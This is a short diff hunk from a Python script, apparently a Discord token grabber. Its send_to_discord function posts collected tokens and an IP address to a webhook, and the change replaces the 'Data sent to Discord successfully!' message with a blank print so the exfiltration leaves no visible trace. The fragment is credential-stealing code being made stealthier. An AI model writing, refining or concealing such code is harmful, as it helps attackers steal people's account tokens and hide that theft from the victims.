@@ -48,7 +48,7 @@ def send_to_discord(tokens, ip_address):
     try:
         response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
         response.raise_for_status()
-        print("Data sent to Discord successfully!")
+        print(" ")
     except requests.exceptions.RequestException as e:
         print(f"Error sending to Discord: {e}")
 
